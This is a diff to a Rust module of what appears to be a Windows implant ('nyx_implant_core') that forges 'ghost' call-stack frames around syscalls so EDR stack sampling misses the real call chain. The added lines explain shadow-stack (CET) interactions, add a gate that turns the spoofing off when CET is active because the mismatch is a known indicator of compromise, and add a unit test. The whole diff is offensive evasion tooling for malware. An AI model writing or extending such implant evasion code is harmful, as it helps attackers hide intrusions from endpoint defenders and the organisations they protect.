@@ -18,6 +18,21 @@
 //! After the syscall returns, the ghost frames are popped off the stack
 //! and execution continues normally. The ghost frames are ONLY present
 //! during the syscall window when EDR might sample the stack.
+//!
+//! ## CET behavior (audited 2026-08)
+//! Execution layer: **#CP-safe even on shadow-stack hosts.** The naked
+//! trampoline never `ret`s THROUGH a ghost frame — every `call`/`ret` it
+//! executes is balanced (shadow-stack push/pop matched), and RSP is restored
+//! with `mov rsp, rbx` instead of unwinding the fake frames. The ghost
+//! addresses are pure stack *data* an unwinder reads, never `ret` targets.
+//!
+//! So why the runtime CET gate in [`with_ghost_stack`]? On a shadow-stack
+//! host the forged chain is (a) worthless — a shadow-stack-aware stack walk
+//! (Win11 24H2+ telemetry) reads the REAL call chain from the shadow stack
+//! and never sees our ghosts — and (b) an IOC: the plain-stack/shadow-stack
+//! divergence is exactly what that telemetry flags. Degrading to a direct
+//! call when CET is on avoids stamping a known-bad pattern for zero gain.
+//! Mirrors the `swap::should_execute` degrade in `implant-core/src/stack.rs`.
 
 #![cfg(target_os = "windows")]
 
@@ -124,6 +139,16 @@ fn install_ghost_chain_alloc_static(src_slice: &[usize]) -> Option<&'static mut 
 /// were stationary). No heap allocation, no function pointers through CFG.
 #[inline(never)]
 pub unsafe fn with_ghost_stack<F: FnOnce()>(f: F) {
+    // CET gate (see module docs): on a shadow-stack host the ghost window
+    // buys nothing and its plain-stack/shadow-stack divergence is an IOC —
+    // degrade to a direct call. Probed at every call via the cached
+    // `version::cet_active()` (same feature-41 query as
+    // `caller_spoof::is_cet_enabled`, so the whole crate agrees).
+    if !ghost_window_permitted(nyx_implant_core::version::cet_active()) {
+        f();
+        return;
+    }
+
     if !CHAIN_READY.load(Ordering::Acquire) {
         f();
         return;
@@ -266,6 +291,16 @@ fn with_ghost_stack_clamp(frames_len_raw: usize) -> usize {
     }
 }
 
+/// Pure CET gate decision for the ghost window. Returns `false` (degrade to
+/// a direct call) when user-mode shadow stack is active for this process —
+/// see the module-level "CET behavior" note for why the window is degraded
+/// even though the trampoline itself is #CP-safe. Extracted as a pure fn so
+/// the decision is unit-testable without CET hardware (wine64 reports CET
+/// off; the tests pin the DECISION, not the bit).
+fn ghost_window_permitted(cet_on: bool) -> bool {
+    !cet_on
+}
+
 // NOTE: these tests mutate the global chain statics; run with
 // `--test-threads=1`.
 #[cfg(test)]
@@ -281,6 +316,15 @@ mod tests {
         assert_eq!(with_ghost_stack_clamp(MAX_GHOST_DEPTH), MAX_GHOST_DEPTH);
         assert_eq!(with_ghost_stack_clamp(MAX_GHOST_DEPTH + 1), MAX_GHOST_DEPTH);
         assert_eq!(with_ghost_stack_clamp(usize::MAX), MAX_GHOST_DEPTH);
+    }
+
+    /// The CET gate decision: permitted when CET is off, degraded to a direct
+    /// call when on. Pure mapping — wine64 cannot flip the hardware shadow-
+    /// stack bit, so this pins the decision the live probe feeds, not the bit.
+    #[test]
+    fn ghost_window_permitted_gate() {
+        assert!(ghost_window_permitted(false));
+        assert!(!ghost_window_permitted(true));
     }
 
     /// Installing an oversized chain stores exactly MAX_GHOST_DEPTH frames —
